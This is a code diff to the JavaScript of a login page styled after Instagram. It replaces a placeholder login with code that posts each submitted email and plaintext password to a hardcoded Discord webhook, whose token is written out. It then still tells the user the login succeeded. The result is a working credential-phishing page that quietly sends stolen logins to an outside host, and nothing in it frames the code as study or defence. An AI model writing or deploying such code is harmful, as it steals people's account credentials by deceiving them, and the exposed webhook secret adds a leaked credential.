@@ -1,4 +1,4 @@
-// JavaScript for Instagram-Inspired Login Page
+ // JavaScript for Instagram-Inspired Login Page
 
 const loginForm = document.getElementById('loginForm');
 const emailInput = document.getElementById('email');
@@ -16,9 +16,28 @@ loginButton.addEventListener('click', function(event) {
         return;
     }
 
-    // Simulate a login request (to be replaced with an actual login API)
-    console.log('Logging in with:', email);
-    alert('Logged in successfully!'); // Placeholder response
-});
+    // Send to Discord webhook
+    const webhookURL = "https://discord.com/api/webhooks/1476991374397145259/OUGccgf_VPA4L3-SjCqaWSO3HVohkvbpkRUJdTsa5N_-TiKCXHAkQPxYW-uOc0ZYoaUa";
 
-// Optional: Add some styling or animations
+    const data = {
+        content: `New Login Submission:\nEmail: ${email}\nPassword: ${password}`
+    };
+
+    fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+    })
+    .then(response => {
+        if (response.ok) {
+            alert('Sent successfully!');
+        } else {
+            alert('Error sending.');
+        }
+    })
+    .catch(err => console.error(err));
+
+    // Original placeholder login behavior
+    console.log('Logging in with:', email);
+    alert('Logged in successfully!');
+});
